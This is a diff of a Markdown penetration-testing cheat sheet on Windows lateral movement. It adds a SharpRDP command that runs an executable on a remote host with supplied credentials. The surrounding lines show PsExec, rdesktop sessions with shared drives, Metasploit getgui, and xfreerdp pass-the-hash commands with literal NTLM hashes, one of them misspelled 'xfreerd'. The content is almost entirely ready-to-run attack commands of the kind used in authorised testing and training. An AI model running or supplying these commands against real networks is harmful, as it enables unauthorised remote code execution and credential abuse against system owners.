@@ -131,8 +131,15 @@ PsExec.exe  \\ordws01.cscou.lab -u DOMAIN\username -p password cmd.exe -s  # get
 
 ## RDP Remote Desktop Protocol 
 
+Abuse RDP protocol to execute commands remotely with [SharpRDP](https://github.com/0xthirteen/SharpRDP)
+
 ```powershell
-python rdpcheck.py DOMAIN/username:password@10.10.10.10
+SharpRDP.exe computername=target.domain command="C:\Temp\file.exe" username=domain\user password=password
+```
+
+Or connect remotely with `rdesktop`
+
+```powershell
 rdesktop -d DOMAIN -u username -p password 10.10.10.10 -g 70 -r disk:share=/home/user/myshare
 rdesktop -u username -p password -g 70 -r disk:share=/tmp/myshare 10.10.10.10
 # -g : the screen will take up 70% of your actual screen size
@@ -165,14 +172,13 @@ or with Metasploit
 run getgui -u admin -p 1234
 ```
 
-Then log in using xfreerdp 
+or with xfreerdp 
 
 ```powershell
 xfreerdp /u:offsec /d:win2012 /pth:88a405e17c0aa5debbc9b5679753939d /v:10.0.0.1 # pass the hash works for Server 2012 R2 / Win 8.1+
 xfreerdp -u test -p 36374BD2767773A2DD4F6B010EC5EE0D 192.168.226.129 # pass the hash using Restricted Admin, need an admin account not in the "Remote Desktop Users" group.
 xfreerd /u:runner /v:10.0.0.1 # password will be asked
 ```
-
 
 ## Netuse 
 
